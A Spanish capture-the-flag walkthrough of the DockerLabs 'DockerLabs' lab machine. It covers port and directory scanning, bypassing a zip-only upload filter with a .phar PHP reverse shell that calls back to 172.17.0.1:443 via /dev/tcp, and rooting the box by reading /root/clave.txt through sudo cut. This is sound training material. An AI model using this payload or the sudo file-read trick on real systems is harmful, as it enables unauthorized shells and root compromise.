#MAQUINA #DOCKERLABS #FACIL  
#ABUSO_SUBIDA_ARCHIVOS 
#BURPSUITE
<hr>

# RECONOCIMIENTO

Vamos a resolver **DockerLabs** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 11:33 CET
Initiating ARP Ping Scan at 11:33
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 11:33, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:33
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 11:33, 0.49s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-11-26 11:33:31 CET for 0s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** abierto.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80 172.17.0.2                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 11:34 CET
Nmap scan report for consolelog.lab (172.17.0.2)
Host is up (0.000025s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Dockerlabs
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.42 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 11:34 CET
Nmap scan report for consolelog.lab (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

**Conclusiones:** En el puerto **80** tenemos un directorio llamado **uploads**.
## HTTP (80)

Al revisar la web que hay en el puerto 80, vemos lo siguiente con **gobuster**:

   ```bash

gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,html,js,txt,png,jpg 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              png,jpg,php,html,js,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/.php                 (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 8235]
/scripts.js           (Status: 200) [Size: 919]
/upload.php           (Status: 200) [Size: 0]
/machine.php          (Status: 200) [Size: 1361]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================

```

**Conclusiones:** 
+ En el puerto **80** tenemos un directorio llamado **uploads**.
+ Hay un **upload.php**.
+ El **machine.php** tiene una subida de archivos que usa el **upload.php** -> solo acepta zip -> vamos a ver si podemos abusar de ello con **burpsuite**

# EXPLOTACION

Vamos a subir un php que nos otorgue una reverse shell. Para ello al subir el archivo interceptamos la petición y cambiamos la extensión a **.phar** y nos ponemos en escucha por el puerto 443 (**nc -nlvp 443**) :

   ```bash

POST /upload.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------221729423711292595004210029748
Content-Length: 424
Origin: http://172.17.0.2
Connection: keep-alive
Referer: http://172.17.0.2/machine.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------221729423711292595004210029748
Content-Disposition: form-data; name="file"; filename="wp.phar"
Content-Type: application/x-php

<?php

	exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>

-----------------------------221729423711292595004210029748
Content-Disposition: form-data; name="submit"

Upload File
-----------------------------221729423711292595004210029748--

```

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:
   ```bash
www-data@d9698e350246:/var/www/html/uploads$ sudo -l
Matching Defaults entries for www-data on d9698e350246:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on d9698e350246:
    (root) NOPASSWD: /usr/bin/cut
    (root) NOPASSWD: /usr/bin/grep

```

Vemos **cut y grep** con permisos SUDO y hay una nota en **/opt** :
   ```bash
www-data@d9698e350246:/tmp$ cd ../opt
www-data@d9698e350246:/opt$ ls -la
total 12
drwxr-xr-x 1 root root 4096 May 17  2024 .
drwxr-xr-x 1 root root 4096 Nov 26 11:33 ..
-rw-r--r-- 1 root root  129 May 17  2024 nota.txt
www-data@d9698e350246:/opt$ sudo cut -d "" -f1 /opt/nota.txt            
Protege la clave de root, se encuentra en su directorio /root/clave.txt, menos mal que nadie tiene permisos para acceder a ella.
www-data@d9698e350246:/opt$ sudo cut -d "" -f1 /root/clave.txt
dockerlabsmolamogollon123
www-data@d9698e350246:/opt$ su root
Password: 
root@d9698e350246:/opt# whoami
root

```

**YA ESTAMOS COMO ROOT.**